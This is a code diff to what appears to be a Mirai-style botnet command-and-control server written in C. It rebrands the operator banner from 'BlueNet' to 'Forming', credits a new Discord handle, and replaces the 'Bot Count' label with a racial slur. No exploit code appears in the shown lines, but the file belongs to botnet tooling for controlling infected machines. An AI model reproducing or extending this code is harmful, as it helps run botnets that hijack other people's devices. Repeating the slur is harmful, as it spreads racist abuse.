@@ -350,16 +350,16 @@ void *BotWorker(void *sock) {
 		char banner_bot_count [2048];
 		memset(banner_bot_count, 0, 2048);
 		
-		sprintf(ascii_banner_line1, "\x1b[36m          Welcome to BlueNet         \r\n");
-		sprintf(ascii_banner_line2, "\x1b[36m   MADE BY CyberDuck#7626 - Discord  \r\n");
-		sprintf(ascii_banner_line3, "\x1b[36m   ______              _   _         \r\n");
-		sprintf(ascii_banner_line4, "\x1b[36m  |  _ \ \            | \ | |        \r\n");
-		sprintf(ascii_banner_line5, "\x1b[36m  | |_) ) \  _   _ ___|  \| |___ ___ \r\n");
-		sprintf(ascii_banner_line6, "\x1b[36m  |  _ ( > \| | | / __)     / __|   )\r\n");
-		sprintf(ascii_banner_line7, "\x1b[36m  | |_) ) ^ \ |_| > _)| |\  > _) | | \r\n");
-		sprintf(ascii_banner_line8, "\x1b[36m  |____/_/ \_\___/\___)_| \_\___) \_)\r\n");
+		sprintf(ascii_banner_line1, "\x1b[36m          Welcome to Forming         \r\n");
+		sprintf(ascii_banner_line2, "\x1b[36m   MADE BY zphantom#7626 - Discord  \r\n");
+		sprintf(ascii_banner_line3, "\x1b[0;34m███████╗ ██████╗ ██████╗ ███╗   ███╗██╗███╗   ██╗ ██████╗\r\n");
+		sprintf(ascii_banner_line4, "\x1b[0;34m██╔════╝██╔═══██╗██╔══██╗████╗ ████║██║████╗  ██║██╔════╝ \r\n");
+		sprintf(ascii_banner_line5, "\x1b[0;34m█████╗  ██║   ██║██████╔╝██╔████╔██║██║██╔██╗ ██║██║  ███╗\r\n");
+		sprintf(ascii_banner_line6, "\x1b[0;34m██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██║██║╚██╗██║██║   ██║\r\n");
+		sprintf(ascii_banner_line7, "\x1b[0;34m██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║██║ ╚████║╚██████╔╝\r\n");
+		sprintf(ascii_banner_line8, "\x1b[0;34m╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ \r\n");
 		sprintf(ascii_banner_line9, "\r\n");	
-		sprintf(welcome_line,       "\x1b[37m        #\x1b[36m----- \x1b[37mBot Count: %d\x1b[36m -----\x1b[37m#\r\n", BotsConnected(), OperatorsConnected); 
+		sprintf(welcome_line,       "\x1b[37m        #\x1b[36m----- \x1b[37mNigga Count: %d\x1b[36m -----\x1b[37m#\r\n", BotsConnected(), OperatorsConnected); 
 		sprintf(banner_bot_count, 	"\r\n\x1b[37m    #\x1b[36m-------- \x1b[37mWelcome, %s\x1b[36m --------\x1b[37m#\r\n", accounts[find_line].username);
 
 		if(send(datafd, ascii_banner_line9, strlen(ascii_banner_line9), MSG_NOSIGNAL) == -1) goto end;
